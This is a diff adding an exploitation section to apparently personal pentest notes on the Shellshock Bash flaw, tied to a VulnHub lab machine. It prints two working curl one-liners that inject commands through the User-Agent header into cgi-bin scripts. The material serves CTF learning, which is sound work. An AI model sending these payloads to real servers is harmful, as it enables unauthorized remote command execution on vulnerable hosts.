@@ -10,7 +10,32 @@ This vulnerability was discover in 2014
 # When can exploit this?
 
 - When the version of the GNU Bash will be 1.13-**4.3** version
+- Normally if you find a **/cgi-bin/** is recommendable to enum a shell shock attack
 
+---
+
+
+# Exploiting
+
+A practice example of exploiting this is [SickOS 1.1](../../CTF/VulnHub/SickOS%201.1.md) machine from VulnHub
+
+In cgi-bin folder, you can enum files with some of this extensions: ls,sh,cgi, you can use [Gobuster](../../Tools/Enumeration/Gobuster.md)
+
+To exploit this attack we are going to play with the **User-Agent** 
+
+In this case we can use this oneline, from the [cloudflare blog website](https://blog.cloudflare.com/inside-shellshock/):
+
+````bash
+curl -H "User-Agent: () { :; }; /bin/eject" http://
+````
+
+With /bin/eject you are able to open the floppy drive
+
+But in this case we are going to util this:
+
+````bash
+curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 -H "User-Agent: () { :; }; /usr/bin/whoami"
+````
 
 ----
 
